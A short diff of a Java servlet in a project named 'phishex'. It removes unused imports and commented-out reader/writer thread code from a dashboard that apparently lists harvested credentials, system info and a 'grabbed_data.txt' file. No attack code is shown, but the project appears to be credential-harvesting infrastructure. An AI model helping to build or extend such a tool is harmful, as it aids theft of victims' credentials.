@@ -1,7 +1,5 @@
 package com.phishex.servlets;
 
-import com.phishex.DataReader;
-import com.phishex.DataWriter;
 import com.phishex.dao.CredentialsDao;
 import com.phishex.dao.SysInfoDao;
 import com.phishex.entity.Credentials;
@@ -20,7 +18,6 @@ import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.util.List;
 import java.util.Scanner;
-import java.util.concurrent.TimeUnit;
 
 @WebServlet("/dashboard")
 public class DashboardServlet extends HttpServlet {
@@ -29,12 +26,6 @@ public class DashboardServlet extends HttpServlet {
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
         try {
-//            DataWriter writer = new DataWriter();
-//            DataReader reader = new DataReader();
-//            writer.start();
-//            reader.start();
-
-            // Data writer
 
             File file = new File("grabbed_data.txt");
 
